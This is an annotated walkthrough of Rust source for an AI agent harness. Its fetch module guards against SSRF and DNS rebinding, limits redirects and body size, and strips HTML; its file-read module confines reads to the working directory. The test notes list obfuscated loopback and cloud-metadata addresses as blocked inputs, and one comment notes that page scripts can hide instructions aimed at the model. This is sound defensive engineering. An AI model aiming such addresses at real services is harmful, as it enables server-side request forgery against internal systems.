394pub fn check_parsed_url(url: &Url, policy: &Policy) -> Result<(), Rejection> {
395 if policy.require_https && url.scheme() != "https" {
396 return Err(Rejection::BadScheme {
397 scheme: url.scheme().to_string(),
398 });
399 }
400 if !url.username().is_empty() || url.password().is_some() {
401 return Err(Rejection::CredentialsInUrl);
402 }
403 let Some(host) = url.host() else {
404 return Err(Rejection::NoHost);
405 };
406 if policy.allow_private_ips {
407 return Ok(());
408 }
409 // A literal-IP host never reaches the resolver, so it is checked here.
410 // `url` has already normalised the obfuscated spellings — `2130706433`
411 // and `0x7f.1` arrive as 127.0.0.1.
412 let ip = match host {
413 Host::Ipv4(v4) => Some(IpAddr::V4(v4)),
414 Host::Ipv6(v6) => Some(IpAddr::V6(v6)),
415 Host::Domain(_) => None,
416 };
417 if let Some(ip) = ip
418 && let Err(reason) = check_ip(ip)
419 {
420 return Err(Rejection::Blocked {
421 host: ip.to_string(),
422 reason,
423 });
424 }
425 Ok(())
426}

struct GuardedResolver — closing the rebinding race

L427–L479

This is the load-bearing part of the file, and the reason the address rules are worth anything at all.

Why the check cannot happen before the request: resolve the host yourself, decide it is fine, and hand the URL to reqwest — and reqwest resolves it again when it connects. A DNS record with a short TTL can answer differently the second time. That is DNS rebinding, and it costs an attacker almost nothing.

ClientBuilder::resolve looks like the fix and is not: it pins only the first host, so a redirect to a second host resolves normally and the window reopens. Implementing reqwest::dns::Resolve instead puts the check inside the lookup reqwest actually performs — the single point that every hop, and every new pooled connection, must pass through. There is no second resolution to race.

Why one bad answer fails the whole lookup: filtering the blocked addresses out and connecting to the survivors is the tempting default, and it is wrong. An attacker returning one good address and one bad one would get the good one now and the bad one when the pool turns over. All-or-nothing is the only fail-closed reading.
427 
428// ---------------------------------------------------------------------------
429// Transport
430// ---------------------------------------------------------------------------
431 
432/// A DNS resolver that refuses to hand back a non-public address.
433///
434/// This has to be reqwest's *own* resolver rather than a check run beforehand.
435/// Resolving separately and then passing the URL to reqwest leaves a rebinding
436/// race, because reqwest resolves again at connect time; and
437/// `ClientBuilder::resolve` only pins the first host, so a redirect to a second
438/// host reopens the same window. As the configured resolver this is the single
439/// point every hop and every new pooled connection must pass through.
440#[derive(Debug, Clone, Copy)]
441struct GuardedResolver {
442 allow_private_ips: bool,
443}
444 
445impl reqwest::dns::Resolve for GuardedResolver {
446 fn resolve(&self, name: reqwest::dns::Name) -> reqwest::dns::Resolving {
447 let host = name.as_str().to_owned();
448 let allow_private_ips = self.allow_private_ips;
449 Box::pin(async move {
450 let addrs: Vec<SocketAddr> = tokio::net::lookup_host((host.as_str(), 0u16))
451 .await
452 .map_err(|e| -> Box<dyn std::error::Error + Send + Sync> {
453 format!("{host} could not be resolved: {e}").into()
454 })?
455 .collect();
456 if addrs.is_empty() {
457 return Err(format!("{host} did not resolve to any address").into());
458 }
459 if !allow_private_ips {
460 // Refuse the whole lookup if any answer is blocked, rather than
461 // filtering to the survivors: a rebinding attacker who returns
462 // one good address and one bad one would otherwise get the good
463 // one now and the bad one when the connection pool turns over.
464 for addr in &addrs {
465 if let Err(reason) = check_ip(addr.ip()) {
466 return Err(Rejection::Blocked {
467 host: format!("{host} ({})", addr.ip()),
468 reason,
469 }
470 .message()
471 .into());
472 }
473 }
474 }
475 Ok(Box::new(addrs.into_iter()) as reqwest::dns::Addrs)
476 })
477 }
478}
479 

Fetcher::new — every setting is load-bearing

L480–L526

A dedicated client, never the OpenRouter one: a separate connection pool, and the client holding your API key is never pointed at a URL the model chose.

.no_proxy() deserves its comment. The crate is built with reqwest's system-proxy feature, so with HTTPS_PROXY set in the environment reqwest would CONNECT to the proxy and the proxy would resolve the target host. GuardedResolver would never be consulted, and the entire address policy would silently do nothing. It is one line that looks like tidying and is actually the difference between the guard working and not.

.https_only(true) is belt and braces over the scheme check — reqwest enforces it at request start and on every redirect hop. The redirect closure caps hops and re-runs the URL rules, refusing with attempt.error(…) rather than stop(), because stopping would hand back the 3xx as a successful response carrying the redirect body.

Why not follow redirects by hand: reqwest already strips sensitive headers on cross-origin and scheme-downgrade hops. Re-implementing that correctly is a bigger risk than the one it would remove.
480/// An HTTP client bound by a [`Policy`].
481#[derive(Debug, Clone)]
482pub struct Fetcher {
483 http: reqwest::Client,
484 policy: Policy,
485}
486 
487impl Fetcher {
488 pub fn new(policy: Policy) -> Result<Self> {
489 let redirect_policy = policy;
490 let http = reqwest::Client::builder()
491 .user_agent(concat!("ai-harness/", env!("CARGO_PKG_VERSION")))
492 // A proxy would resolve the target host itself, so `GuardedResolver`
493 // would never see it and the address rules would silently do
494 // nothing. The `system-proxy` feature is on, so this is load-bearing
495 // rather than tidying: do not remove it.
496 .no_proxy()
497 .https_only(policy.require_https)
498 .referer(false)
499 .dns_resolver(GuardedResolver {
500 allow_private_ips: policy.allow_private_ips,
501 })
502 .redirect(reqwest::redirect::Policy::custom(move |attempt| {
503 if attempt.previous().len() >= redirect_policy.max_redirects {
504 return attempt.error(
505 Rejection::TooManyRedirects {
506 limit: redirect_policy.max_redirects,
507 }
508 .message(),
509 );
510 }
511 match check_parsed_url(attempt.url(), &redirect_policy) {
512 Ok(()) => attempt.follow(),
513 // `error` rather than `stop`: stopping would surrender the
514 // 3xx as a successful response carrying the redirect body.
515 Err(rejection) => attempt.error(rejection.message()),
516 }
517 }))
518 .connect_timeout(policy.timeout)
519 .timeout(policy.timeout)
520 .build()
521 .context("building the fetch HTTP client")?;
522 Ok(Self { http, policy })
523 }
524 
525 /// Fetch a URL, returning the outcome as data. Never returns an error: a
526 /// refusal is something the model should see and work around.

fn fetch — the cancellable wrapper

L527–L542

The public entry point never returns an error: a refusal is something the model should see and work around, so everything lands in a FetchOutcome.

biased; in the select, exactly as in exec.rs, so a fast response cannot starve the interrupt. On Esc the task stops and the generation counter has already moved on, so the outcome is dropped as stale.

527 pub async fn fetch(&self, raw: &str, cancel: impl Future<Output = ()>) -> FetchOutcome {
528 tokio::pin!(cancel);
529 let work = self.try_fetch(raw);
530 tokio::pin!(work);
531 let result = tokio::select! {
532 // Interrupt wins a race with a fast response, matching `exec`.
533 biased;
534 _ = &mut cancel => Err(Rejection::Cancelled),
535 result = &mut work => result,
536 };
537 match result {
538 Ok(outcome) => outcome,
539 Err(rejection) => FetchOutcome::failed(raw, rejection.message()),
540 }
541 }
542 

fn try_fetch — the request, in order

L543–L610

Validate, send under a timeout, re-check where it landed, gate the status, gate the content type, read a bounded body, extract.

The outer tokio::time::timeout is not redundant with the one on the builder: a body that drips a byte at a time never goes idle, so only a total bound stops it.

Re-running check_parsed_url on the response's final URL is cheap defence in depth — the hops were vetted on the way through, and this catches a policy that let something past anyway.

Both caps are applied here: the raw body stops at max_bytes, and the extracted text is cut to MAX_TEXT_BYTES on a character boundary. Either one sets truncated, which the result message turns into an explicit note to the model.

543 async fn try_fetch(&self, raw: &str) -> Result<FetchOutcome, Rejection> {
544 let url = check_url(raw, &self.policy)?;
545 
546 // `timeout` on the builder bounds the request, but an outer bound also
547 // covers a body that drips forever without ever going idle.
548 let send = self.http.get(url.clone()).send();
549 let response = match tokio::time::timeout(self.policy.timeout, send).await {
550 Err(_) => {
551 return Err(Rejection::Timeout {
552 seconds: self.policy.timeout.as_secs(),
553 });
554 }
555 Ok(Err(e)) => return Err(transport_rejection(&e, &self.policy)),
556 Ok(Ok(response)) => response,
557 };
558 
559 let final_url = response.url().clone();
560 // Redirects were vetted hop by hop, but re-checking where we landed is
561 // cheap and catches a policy that let something through.
562 check_parsed_url(&final_url, &self.policy)?;
563 
564 let status = response.status();
565 if !status.is_success() {
566 return Err(Rejection::BadStatus {
567 status: status.as_u16(),
568 });
569 }
570 
571 let content_type = response
572 .headers()
573 .get(reqwest::header::CONTENT_TYPE)
574 .and_then(|value| value.to_str().ok())
575 .map(str::to_string);
576 if let Some(content_type) = &content_type
577 && !is_textual(content_type)
578 {
579 return Err(Rejection::UnsupportedContentType {
580 content_type: content_type.clone(),
581 });
582 }
583 
584 let (body, mut truncated) = read_capped(response, self.policy.max_bytes).await?;
585 let bytes = body.len();
586 let mut text = extract_text(content_type.as_deref(), &body);
587 if text.len() > MAX_TEXT_BYTES {
588 let cut = floor_char_boundary(&text, MAX_TEXT_BYTES);
589 text.truncate(cut);
590 truncated = true;
591 }
592 
593 Ok(FetchOutcome {
594 url: raw.trim().to_string(),
595 final_url: (final_url.as_str() != url.as_str()).then(|| final_url.to_string()),
596 status: Some(status.as_u16()),
597 content_type,
598 text,
599 bytes,
600 truncated,
601 error: None,
602 })
603 }
604}
605 
606/// Turn a reqwest failure into a rejection, recovering the underlying message.
607///
608/// A refusal from [`GuardedResolver`] or the redirect policy surfaces as a
609/// generic connect error with the real message buried in the source chain, so
610/// walk the chain rather than reporting "error sending request".

fn transport_rejection — recovering the real message

L611–L628

A refusal from the resolver or the redirect policy surfaces as a generic connect error, with the message that actually explains it buried in the source chain. Walking Error::source() to the deepest link recovers it without adding any shared mutable state to smuggle it out.

Without this the model would be told "error sending request" and would sensibly retry the same blocked URL.

611fn transport_rejection(error: &reqwest::Error, policy: &Policy) -> Rejection {
612 if error.is_timeout() {
613 return Rejection::Timeout {
614 seconds: policy.timeout.as_secs(),
615 };
616 }
617 let mut source: Option<&(dyn std::error::Error + 'static)> = std::error::Error::source(error);
618 let mut deepest: Option<String> = None;
619 while let Some(current) = source {
620 deepest = Some(current.to_string());
621 source = current.source();
622 }
623 Rejection::Transport {
624 message: deepest.unwrap_or_else(|| error.to_string()),
625 }
626}
627 
628/// Stream the body, stopping once the cap is reached.

read_capped, is_textual, floor_char_boundary

L629–L663

read_capped streams the body and stops at the cap rather than buffering it whole — the same bounded-read idea as exec::read_capped and files::read, so a hostile or merely enormous response cannot decide how much memory this process uses.

floor_char_boundary is what makes truncation safe on a multi-byte character; the stable inherent method is still unstable, so it is four lines here.

629async fn read_capped(
630 response: reqwest::Response,
631 max: usize,
632) -> Result<(Vec<u8>, bool), Rejection> {
633 let mut stream = response.bytes_stream();
634 let mut body: Vec<u8> = Vec::new();
635 let mut truncated = false;
636 while let Some(chunk) = stream.next().await {
637 let chunk = chunk.map_err(|e| Rejection::Transport {
638 message: format!("the response body could not be read: {e}"),
639 })?;
640 let room = max.saturating_sub(body.len());
641 if chunk.len() > room {
642 body.extend_from_slice(&chunk[..room]);
643 truncated = true;
644 break;
645 }
646 body.extend_from_slice(&chunk);
647 }
648 Ok((body, truncated))
649}
650 
651fn is_textual(content_type: &str) -> bool {
652 let lowered = content_type.to_ascii_lowercase();
653 TEXTUAL_TYPES.iter().any(|kind| lowered.contains(kind))
654}
655 
656/// Largest index at or below `at` that lands on a character boundary.
657fn floor_char_boundary(text: &str, at: usize) -> usize {
658 let mut at = at.min(text.len());
659 while at > 0 && !text.is_char_boundary(at) {
660 at -= 1;
661 }
662 at
663}

the extraction tables

L664–L702

Two lists: subtrees whose contents are never page text and are dropped whole, and tags that end a line. pre is deliberately absent from the second — its whitespace is content, so it gets its own mode below rather than being flattened like everything else.

Dropping <script> as a subtree rather than as a tag matters — stripping only the tags would leave the JavaScript behind as prose, which is both a waste of context and a fine place to hide an instruction aimed at the model.

664 
665// ---------------------------------------------------------------------------
666// Extraction
667// ---------------------------------------------------------------------------
668 
669/// Tags whose entire subtree is dropped — none of it is page text.
670const DROPPED_SUBTREES: [&str; 7] = [
671 "script", "style", "head", "nav", "footer", "svg", "noscript",
672];
673 
674/// Tags that end a line of text.
675///
676/// `pre` is deliberately absent: its whitespace is content, so it is handled as
677/// its own mode rather than as one more line break. See [`strip_html`].
678const BLOCK_TAGS: [&str; 20] = [
679 "p",
680 "div",
681 "br",
682 "hr",
683 "li",
684 "ul",
685 "ol",
686 "h1",
687 "h2",
688 "h3",

701/// Reduce a response body to text worth putting in a model's context.
702///

fn extract_text and fn is_html

L703–L725

Anything that is not HTML passes through untouched. JSON, Markdown and plain text are already the thing we want, and are probably most of the real traffic — raw file URLs, API responses, changelogs.

Bytes become text with from_utf8_lossy, matching files::read. The known limitation is written down rather than discovered: a non-UTF-8 charset= is ignored.

703/// Anything that is not HTML passes through untouched: JSON, Markdown, and
704/// plain text are already what we want, and are probably most of the traffic.
705pub fn extract_text(content_type: Option<&str>, body: &[u8]) -> String {
706 // Matching `files::read`, bytes become text lossily rather than failing. A
707 // known limitation: a non-UTF-8 `charset=` in the content type is ignored.
708 let text = String::from_utf8_lossy(body);
709 if content_type.is_some_and(is_html) {
710 strip_html(&text)
711 } else {
712 text.into_owned()
713 }
714}
715 
716fn is_html(content_type: &str) -> bool {
717 let lowered = content_type.to_ascii_lowercase();
718 lowered.contains("text/html") || lowered.contains("application/xhtml")
719}

721/// A run of extracted text, and whether its whitespace is content.
722///
723/// Keeping the two apart is what lets `<pre>` survive: flow text is collapsed
724/// and tidied, preformatted text is not. Doing it with a sentinel string in one
725/// buffer would work until a page contained the sentinel.

enum Chunk and fn strip_html — a stripper, not a parser

L726–L866

Deliberately not a parser, and the doc comment says what that costs: no list structure, no tables, no link targets. What it buys is about a hundred lines and no new dependency, in a codebase that hand-rolls its SSE framing for the same reason.

Why <pre> is the one exception: in a coding harness the code examples usually are the page. Collapsing them onto one line — which is what treating <pre> as just another block tag does — makes the most useful part of a documentation page materially harder to read. So a <pre> subtree keeps its whitespace verbatim while its tags are still stripped: syntax highlighting is markup, the line breaks around it are not.

Chunk is what makes that possible without a sentinel string. Flow text and preformatted text end up in separate runs, each tidied by its own rules and joined at the end — a marker in one buffer would work right up until a page contained the marker.

Why the line break is deferred: pending_break records that a block boundary happened and only emits a newline when actual text follows. Writing it immediately would emit two breaks per element — one for <p> and one for </p> — and would open every document with a blank line.

Whitespace-only text between tags is kept (it separates words across inline elements) but does not satisfy a pending break, which is why </p> <p> still produces exactly one newline.

Nested <pre> opens are counted so an inner one cannot end the outer block early, and an unclosed <pre> — like an unclosed dropped tag — still keeps what it collected rather than losing it.

726enum Chunk {
727 Flow(String),
728 Pre(String),
729}
730 
731/// Turn HTML into plain text.
732///
733/// Deliberately a stripper, not a parser: it drops the subtrees that never hold
734/// page text, breaks lines at block boundaries, and removes the rest of the
735/// markup. It does not reconstruct lists, tables, or link targets.
736///
737/// `<pre>` is the one exception, because in a coding harness it is the payload
738/// rather than decoration: a documentation page is mostly read for its examples,
739/// and an example whose newlines and indentation have been collapsed onto one
740/// line is materially harder to use than the same text laid out. So a `<pre>`
741/// subtree keeps its whitespace verbatim while its tags are still stripped —
742/// syntax highlighting is markup, the line breaks around it are not.
743fn strip_html(input: &str) -> String {
744 let bytes = input.as_bytes();
745 let mut chunks: Vec<Chunk> = Vec::new();
746 let mut out = String::with_capacity(input.len() / 2);
747 // `Some` while inside a `<pre>`; its depth counts nested `<pre>` opens so a
748 // stray inner one cannot end the block early.
749 let mut pre: Option<(String, usize)> = None;
750 let mut i = 0;
751 // A block boundary is recorded rather than written immediately. Writing it
752 // straight out would emit two breaks per element (one for `<p>`, one for
753 // `</p>`) and would break lines before any text had been seen.
754 let mut pending_break = false;
755 
756 while i < bytes.len() {
757 if bytes[i] != b'<' {
758 let start = i;
759 while i < bytes.len() && bytes[i] != b'<' {
760 i += 1;
761 }
762 if let Some((buf, _)) = &mut pre {
763 // Inside a `<pre>` the whitespace *is* the content.
764 buf.push_str(&input[start..i]);
765 continue;
766 }
767 // In HTML every run of whitespace is one space, including newlines
768 // in the source. Collapsing here means the only line breaks in the
769 // output are the ones block tags asked for.
770 let chunk = collapse_whitespace(&input[start..i]);
771 if chunk.trim().is_empty() {
772 // Whitespace between two inline elements still separates words,
773 // so it is kept — but it does not satisfy a pending break.
774 out.push_str(&chunk);
775 } else {
776 if pending_break && !out.is_empty() {
777 out.push('\n');
778 }
779 pending_break = false;
780 out.push_str(&chunk);
781 }
782 continue;
783 }
784 
785 if input[i..].starts_with("<!--") {
786 match input[i + 4..].find("-->") {
787 Some(offset) => i += 4 + offset + 3,
788 None => break,
789 }
790 continue;
791 }
792 
793 // An unterminated '<' is the end of anything useful.
794 let Some(offset) = input[i..].find('>') else {
795 break;
796 };
797 let inner = &input[i + 1..i + offset];
798 i += offset + 1;
799 
800 let is_closing = inner.starts_with('/');
801 let name: String = inner
802 .trim_start_matches('/')
803 .chars()
804 .take_while(char::is_ascii_alphanumeric)
805 .collect::<String>()
806 .to_ascii_lowercase();
807 
808 if !is_closing && !inner.ends_with('/') && DROPPED_SUBTREES.contains(&name.as_str()) {
809 match find_close_tag(&input[i..], &name) {
810 Some(offset) => i += offset,
811 // Unclosed: the rest of the document belongs to it.
812 None => break,
813 }
814 continue;
815 }
816 
817 if name == "pre" && !inner.ends_with('/') {
818 match (&mut pre, is_closing) {
819 // Nested opens are counted so an inner `<pre>` cannot end the
820 // outer one on its closing tag.
821 (Some((_, depth)), false) => *depth += 1,
822 (Some((_, depth)), true) if *depth > 1 => *depth -= 1,
823 (Some(_), true) => {
824 let (buf, _) = pre.take().expect("just matched Some");
825 chunks.push(Chunk::Flow(std::mem::take(&mut out)));
826 chunks.push(Chunk::Pre(buf));
827 pending_break = false;
828 }
829 (None, false) => pre = Some((String::new(), 1)),
830 // A stray `</pre>` with nothing open is not worth reacting to.
831 (None, true) => {}
832 }
833 continue;
834 }
835 
836 if pre.is_none() && BLOCK_TAGS.contains(&name.as_str()) {
837 pending_break = true;
838 }
839 }
840 
841 // An unclosed `<pre>` still keeps what it collected.
842 if let Some((buf, _)) = pre {
843 chunks.push(Chunk::Flow(std::mem::take(&mut out)));
844 chunks.push(Chunk::Pre(buf));
845 }
846 chunks.push(Chunk::Flow(out));
847 
848 let mut text = String::new();
849 for chunk in chunks {
850 let part = match chunk {
851 Chunk::Flow(s) => tidy(&decode_entities(&s)),
852 Chunk::Pre(s) => tidy_pre(&decode_entities(&s)),
853 };
854 if part.is_empty() {
855 continue;
856 }
857 if !text.is_empty() {
858 text.push('\n');
859 }
860 text.push_str(&part);
861 }
862 text
863}
864 
865/// Reduce every run of whitespace to one space, keeping whether the chunk had
866/// whitespace at either end so adjacent inline elements do not run together.

collapse_whitespace and find_close_tag

L867–L904

collapse_whitespace is what makes the line structure come from block tags alone. In HTML every run of whitespace — newlines included — is one space, so collapsing it as text is emitted means the only newlines left in the buffer are the ones a block tag asked for. Leading and trailing whitespace survives as a single space so inline elements do not run together.

find_close_tag matches case-insensitively without lowercasing the remaining document on every call, which would make the stripper quadratic on a page with many script tags.

867fn collapse_whitespace(chunk: &str) -> String {
868 let mut out = String::with_capacity(chunk.len());
869 let mut pending_space = false;
870 for ch in chunk.chars() {
871 if ch.is_whitespace() {
872 pending_space = true;
873 continue;
874 }
875 if pending_space {
876 out.push(' ');
877 pending_space = false;
878 }
879 out.push(ch);
880 }
881 if pending_space {
882 out.push(' ');
883 }
884 out
885}
886 
887/// Index just past the matching `</name>`, searched case-insensitively.
888fn find_close_tag(haystack: &str, name: &str) -> Option<usize> {
889 let bytes = haystack.as_bytes();
890 for i in 0..bytes.len() {
891 if bytes[i] != b'<' || bytes.get(i + 1) != Some(&b'/') {
892 continue;
893 }
894 let rest = &haystack[i + 2..];
895 let matches = rest.len() > name.len()
896 && rest.as_bytes()[..name.len()].eq_ignore_ascii_case(name.as_bytes())
897 && rest[name.len()..].starts_with(|c: char| c == '>' || c.is_whitespace());
898 if matches {
899 return haystack[i..].find('>').map(|offset| i + offset + 1);
900 }
901 }
902 None
903}
904 

decode_entities and decode_entity

L905–L977

The named entities that actually appear in prose, plus numeric and hex forms. An unrecognised entity is left alone, and a bare & survives as itself — "Tom & Jerry" is not markup.

The comment on the scan bound is a real bug, caught by a live fetch: this used to bound the search with rest[..rest.len().min(12)]. Slicing a Rust string at a byte offset panics if the offset is not a character boundary — so a & followed by an emoji brought the harness down. The Rust standard-library docs contain a 🔬, so the first real fetch of a doc page hit it. Scanning by character instead cannot land mid-character.
905fn decode_entities(input: &str) -> String {
906 if !input.contains('&') {
907 return input.to_string();
908 }
909 let mut out = String::with_capacity(input.len());
910 let mut rest = input;
911 while let Some(start) = rest.find('&') {
912 out.push_str(&rest[..start]);
913 rest = &rest[start..];
914 // An entity is short; anything longer is a stray ampersand. Scan by
915 // character rather than slicing at a byte offset — a '&' followed by an
916 // emoji would otherwise cut a multi-byte character in half and panic.
917 let end = rest
918 .char_indices()
919 .take(12)
920 .find(|(_, ch)| *ch == ';')
921 .map(|(index, _)| index);
922 let Some(end) = end else {
923 out.push('&');
924 rest = &rest[1..];
925 continue;
926 };
927 match decode_entity(&rest[1..end]) {
928 Some(decoded) => {
929 out.push_str(&decoded);
930 rest = &rest[end + 1..];
931 }
932 None => {
933 out.push('&');
934 rest = &rest[1..];
935 }
936 }
937 }
938 out.push_str(rest);
939 out
940}
941 
942fn decode_entity(name: &str) -> Option<String> {
943 let named = match name {
944 "amp" => "&",
945 "lt" => "<",
946 "gt" => ">",
947 "quot" => "\"",
948 "apos" => "'",
949 "nbsp" => " ",
950 "mdash" => "—",
951 "ndash" => "–",
952 "hellip" => "…",
953 "copy" => "©",
954 "reg" => "®",
955 "trade" => "™",
956 "rsquo" => "'",
957 "lsquo" => "'",
958 "ldquo" => "\u{201c}",
959 "rdquo" => "\u{201d}",
960 _ => "",
961 };
962 if !named.is_empty() {
963 return Some(named.to_string());
964 }
965 let digits = name.strip_prefix('#')?;
966 let code = match digits.strip_prefix(['x', 'X']) {
967 Some(hex) => u32::from_str_radix(hex, 16).ok()?,
968 None => digits.parse::<u32>().ok()?,
969 };
970 char::from_u32(code).map(String::from)
971}
972 
973/// Tidy a preformatted block without touching what makes it preformatted.
974///
975/// Trailing spaces go and blank lines are trimmed from both ends — neither
976/// carries meaning — but indentation and interior line breaks are left exactly
977/// as they were, which is the whole point of treating `<pre>` separately.

tidy_pre and tidy — the last pass

L978–L1021

Two finishers, and the difference between them is the whole <pre> story in miniature.

tidy handles flow text: it collapses runs of spaces within a line and runs of blank lines between them, so a heavily nested document does not arrive as a column of whitespace.

tidy_pre removes only what cannot carry meaning — trailing spaces, and blank lines at either end, so the newline browsers ignore after <pre> does not become a blank first line. Indentation and interior line breaks are left exactly as they were.

978fn tidy_pre(input: &str) -> String {
979 let mut lines: Vec<&str> = input.lines().map(str::trim_end).collect();
980 while lines.first().is_some_and(|line| line.is_empty()) {
981 lines.remove(0);
982 }
983 while lines.last().is_some_and(|line| line.is_empty()) {
984 lines.pop();
985 }
986 lines.join("\n")
987}
988 
989/// Collapse the whitespace an HTML document leaves behind: runs of spaces
990/// within a line, and runs of blank lines between them.
991fn tidy(input: &str) -> String {
992 let mut out = String::with_capacity(input.len());
993 let mut blank_run = 0;
994 for line in input.lines() {
995 let mut collapsed = String::with_capacity(line.len());
996 let mut pending_space = false;
997 for ch in line.chars() {
998 if ch.is_whitespace() {
999 pending_space = true;
1000 continue;
1001 }
1002 if pending_space && !collapsed.is_empty() {
1003 collapsed.push(' ');
1004 }
1005 pending_space = false;
1006 collapsed.push(ch);
1007 }
1008 if collapsed.is_empty() {
1009 blank_run += 1;
1010 // One blank line separates paragraphs; more is just markup residue.
1011 if blank_run == 1 {
1012 out.push('\n');
1013 }
1014 continue;
1015 }
1016 blank_run = 0;
1017 out.push_str(&collapsed);
1018 out.push('\n');
1019 }
1020 out.trim().to_string()
1021}

What the tests cover

~700 lines, in three groups that match the three seams — and the split is the point, because only one of them touches a socket.

The rules are table-driven and pure: roughly forty addresses and twenty-five URLs, run against Policy::strict. Loopback in every spelling (127.0.0.1, [::1], 2130706433, 0x7f.0.0.1, ::ffff:169.254.169.254), the cloud metadata address, private and unique-local ranges, http, file, data, credentials in the URL. Plus the fail-closed check: 4000::1 is refused with no rule naming it.

The transport runs against a real TcpListener on 127.0.0.1 with the loosened policy — byte cap, content-type refusal, non-2xx, redirect following, redirect cap, and cancellation. The server thread is detached on purpose: a test that stops early (a refused redirect) leaves it parked in accept, and joining would hang the suite instead of failing it.

The extraction is pure byte-strings in, text out. Script and style subtrees, entities, block breaks, comments, invalid UTF-8, and the &-then-emoji case that used to panic. Six cover <pre> alone: indentation and line breaks kept, tags inside still stripped, ends trimmed but interior blank lines kept, entities decoded, a dropped subtree inside a block still dropped, and an unclosed block keeping what it collected.

Four more are #[ignore]d live tests. The one worth knowing about is live_refuses_a_host_that_resolves_to_loopback: it fetches a real public hostname that resolves to 127.0.0.1. The URL rules cannot catch that one — only GuardedResolver can, and the test proves it does. Another asserts against the real Rust standard-library docs that a code example does not come back flattened onto one line.

files.rs

211 lines of code · 242 lines of tests

Resolves and reads files for <ai-harness-read>, and pre-flights <ai-harness-edit> into a full-file rewrite.

uses sandbox

used by app, protocol

This file exists because of one product decision: a read should not interrupt you. An agent that wants to look at four files before doing anything should not pop four approval modals first.

The module doc explains what earns that exemption. A read is non-mutating and names exactly one concrete path, so it can be resolved in-process — and the policy here is deliberately tighter than the shell's: shell commands may read anywhere outside the denylist, but a read element is confined to the working-directory subtree. An auto-approved read ships file contents to OpenRouter, so it must not be able to reach paths you never agreed to send.

The second half of the file handles edits. The key idea is pre-flight: an edit is resolved against the file before the approval modal, so an edit that cannot apply never bothers you at all.

module doc and MAX_READ_BYTES

L1–L23

The doc comment is the argument for the whole design; the second paragraph is the technical claim.

Why resolving one path in-process is sound when parsing a shell command is not: canonicalize collapses .. and symlinks before the prefix check — the same "compare the resolved path" rule the kernel applies. A shell command has no single path to resolve; it is an arbitrary program.

64 KB is large enough for essentially any source file and small enough that one read cannot dominate the context window.

1//! Reading files for the model, resolved against the sandbox root.
2//!
3//! Unlike `<ai-harness-shell>`, a read is non-mutating and names exactly one
4//! path, so it runs without the approval modal. That trade is only sound
5//! because the policy here is *tighter* than the sandbox's: shell commands may
6//! read anywhere outside the denylist, while a read element is confined to the
7//! working-directory subtree. An auto-approved read ships file contents to
8//! OpenRouter, so it must not be able to reach arbitrary paths.
9//!
10//! Resolving a single concrete path in-process is sound in a way that parsing a
11//! shell command never is: `canonicalize` resolves `..` and symlinks before the
12//! prefix check, which is the same "compare the *resolved* path" rule the
13//! kernel applies (see [`crate::sandbox`]). It also skips a `sandbox-exec`
14//! spawn, which matters when reads are meant to feel free.
15 
16use std::io::Read;
17use std::path::{Path, PathBuf};

19use crate::sandbox::Sandbox;

21/// Cap on a single read. Large enough for essentially any source file, small
22/// enough that one read cannot dominate the context window.

const MAX_EDIT_BYTES

L24–L29

4 MB, and notice it is much larger than the read cap — with a good reason. An edit rebuilds and rewrites the whole file, so it must load every byte. A truncating read here would write the file back with its tail silently deleted.

24 
25/// Cap on a file an edit may rewrite. An edit rebuilds and rewrites the *whole*
26/// file, so — unlike a read — it must load every byte; refusing past this bound
27/// keeps a huge file from being pulled into memory and, worse, written back
28/// truncated. Well above any hand-edited source file.
29pub const MAX_EDIT_BYTES: u64 = 4 * 1024 * 1024;

struct ReadOutcome

L30–L42

Mirrors exec::WriteOutcome deliberately, and the doc comment states the shared principle: a failure is data to hand back to the model, not an error that ends the turn. A bad path costs one round-trip; the model reads the message and tries a different path.

path is stored as the model wrote it, not canonicalised, so the result message echoes back something the model recognises.

31/// The outcome of a file read. Mirrors [`crate::exec::WriteOutcome`]: a failure
32/// is data to hand back to the model, not an error that ends the turn.
33#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
34pub struct ReadOutcome {
35 /// The path as the model wrote it, for display and for the result message.
36 pub path: String,
37 pub contents: String,
38 pub lines: usize,
39 /// The file was longer than [`MAX_READ_BYTES`] and only the head is here.
40 pub truncated: bool,

fn resolve — the confinement check

L71–L111

The security-critical function in this file. Order matters:

  1. Join relative paths onto the root (absolute paths pass through, to be caught by the prefix check below).
  2. canonicalize — resolves .. and every symlink.
  3. starts_with(root) on the resolved path.
  4. sandbox.denies_read for the credential denylist.
Why the order is the whole point: canonicalising before the prefix check is what catches a symlink inside the root that points outside it. Check first and resolve later and that escape sails through.

Two details worth keeping: Path::starts_with compares whole components, so /rootbeer is correctly not inside /root — a plain string starts_with would get this wrong. And canonicalising doubles as an existence check, so a missing file is reported here with a clear message.

71 
72/// Resolve `path` against the sandbox root, rejecting anything outside it.
73///
74/// The path is canonicalised first, so `..` segments and symlinks are collapsed
75/// before the prefix check rather than after — a symlink inside the root that
76/// points outside it is refused, which a string comparison would wave through.
77/// Canonicalising also proves the file exists, so a missing file is reported
78/// here rather than surfacing later as a confusing read failure.
79pub fn resolve(sandbox: &Sandbox, path: &str) -> Result<PathBuf, String> {
80 if path.trim().is_empty() {
81 return Err("no path was given".to_string());
82 }
83 let root = sandbox.root();
84 let requested = Path::new(path);
85 let joined = if requested.is_absolute() {
86 requested.to_path_buf()
87 } else {
88 root.join(requested)
89 };
90 
91 let resolved = std::fs::canonicalize(&joined).map_err(|e| match e.kind() {
92 std::io::ErrorKind::NotFound => format!("{path}: no such file"),
93 std::io::ErrorKind::PermissionDenied => format!("{path}: permission denied"),
94 _ => format!("{path}: {e}"),
95 })?;
96 
97 // `Path::starts_with` compares whole components, so `/rootbeer` does not
98 // count as being inside `/root`.
99 if !resolved.starts_with(root) {
100 return Err(format!(
101 "{path} is outside the working directory; access is confined to {}",
102 root.display()
103 ));
104 }
105 if sandbox.denies_read(&resolved) {
106 return Err(format!(
107 "{path} holds credentials and is not readable by design"
108 ));
109 }
110 Ok(resolved)
111}

fn read — bounded, text-only

L112–L156

Every failure returns a ReadOutcome carrying a message rather than propagating an error.

file.take(MAX_READ_BYTES + 1) reads one byte past the cap, which is how truncation is detected without pulling a multi-gigabyte file into memory to find out how big it was.

The NUL-byte check rejects binaries: sending a blob would waste the context window and tell the model nothing. from_utf8_lossy handles the case where the 64 KB cut lands mid-character — that becomes U+FFFD rather than an error.

112 
113/// Read a file for the model, bounded by [`MAX_READ_BYTES`].
114///
115/// Every failure mode comes back as a `ReadOutcome` carrying an error the model
116/// can act on, so a bad path costs a round-trip rather than ending the turn.
